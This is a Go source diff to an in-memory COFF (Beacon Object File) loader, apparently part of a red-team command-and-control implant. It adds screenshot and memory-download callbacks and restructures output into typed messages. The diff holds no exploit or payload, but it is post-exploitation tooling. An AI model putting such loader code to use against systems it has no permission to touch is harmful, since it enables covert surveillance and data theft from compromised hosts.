@@ -5,6 +5,7 @@ package coffer
 import (
 	_ "embed"
 	"fmt"
+	"gopher/utils"
 	"runtime/debug"
 	"strings"
 	"syscall"
@@ -107,6 +108,10 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				fallthrough
 			case string("BeaconCleanupProcess"):
 				fallthrough
+			case string("AxAddScreenshot"):
+				return windows.NewCallback(boffer.AxAddScreenshot(outChannel))
+			case string("AxDownloadMemory"):
+				return windows.NewCallback(boffer.AxDownloadMemory(outChannel))
 			default:
 				fmt.Printf("Unknown symbol: %s\n", procName)
 				return 0
@@ -183,11 +188,11 @@ type CoffSection struct {
 	Address uintptr
 }
 
-func Load(coffBytes []byte, argBytes []byte) (string, error) {
+func Load(coffBytes []byte, argBytes []byte) ([]utils.BofMsg, error) {
 	return LoadWithMethod(coffBytes, argBytes, "go")
 }
 
-func LoadWithMethod(coffBytes []byte, argBytes []byte, method string) (string, error) {
+func LoadWithMethod(coffBytes []byte, argBytes []byte, method string) ([]utils.BofMsg, error) {
 	output := make(chan interface{})
 
 	parsedCoff := Explore(binutil.WrapByteSlice(coffBytes))
@@ -227,7 +232,7 @@ func LoadWithMethod(coffBytes []byte, argBytes []byte, method string) (string, e
 
 		addr, err := virtualAlloc(0, allocationSize, MEM_COMMIT|MEM_RESERVE|MEM_TOP_DOWN, PAGE_READWRITE)
 		if err != nil {
-			return "", fmt.Errorf("VirtualAlloc failed: %s", err.Error())
+			return []utils.BofMsg{}, fmt.Errorf("VirtualAlloc failed: %s", err.Error())
 		}
 
 		if strings.HasPrefix(section.NameString(), ".bss") {
@@ -246,7 +251,7 @@ func LoadWithMethod(coffBytes []byte, argBytes []byte, method string) (string, e
 
 	gotBaseAddress, err := virtualAlloc(0, uintptr(gotSize), MEM_COMMIT|MEM_RESERVE|MEM_TOP_DOWN, PAGE_READWRITE)
 	if err != nil {
-		return "", fmt.Errorf("VirtualAlloc failed: %s", err.Error())
+		return []utils.BofMsg{}, fmt.Errorf("VirtualAlloc failed: %s", err.Error())
 	}
 
 	for _, section := range parsedCoff.Sections.Array() {
@@ -270,7 +275,7 @@ func LoadWithMethod(coffBytes []byte, argBytes []byte, method string) (string, e
 					externalAddress := resolveExternalAddress(symbol.NameString(), output)
 
 					if externalAddress == 0 {
-						return "", fmt.Errorf("failed to resolve external address for symbol: %s", symbol.NameString())
+						return []utils.BofMsg{}, fmt.Errorf("failed to resolve external address for symbol: %s", symbol.NameString())
 					}
 
 					if existingGotAddress, exists := gotMap[symbol.NameString()]; exists {
@@ -298,7 +303,7 @@ func LoadWithMethod(coffBytes []byte, argBytes []byte, method string) (string, e
 			oldProtect := PAGE_READWRITE
 			_, _, errVirtualProtect := procVirtualProtect.Call(sectionVirtualAddr, uintptr(section.SizeOfRawData), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 			if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
-				return "", fmt.Errorf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error())
+				return []utils.BofMsg{}, fmt.Errorf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error())
 			}
 		}
 	}
@@ -306,11 +311,25 @@ func LoadWithMethod(coffBytes []byte, argBytes []byte, method string) (string, e
 	// Call the entry point
 	go invokeMethod(method, argBytes, parsedCoff, sections, output)
 
-	bofOutput := ""
+	var msgs []utils.BofMsg
+
+	bofMsg := utils.BofMsg{}
 	for msg := range output {
-		bofOutput += msg.(string) + "\n"
+		switch msg.(type) {
+
+		case int:
+			bofMsg.Type = msg.(int)
+
+		case []byte:
+			bofMsg.Data = msg.([]byte)
+			msgs = append(msgs, bofMsg)
+			bofMsg = utils.BofMsg{}
+
+		default:
+			bofMsg = utils.BofMsg{}
+		}
 	}
-	return bofOutput, nil
+	return msgs, nil
 }
 
 func invokeMethod(methodName string, argBytes []byte, parsedCoff *File, sectionMap map[string]CoffSection, outChannel chan<- interface{}) {
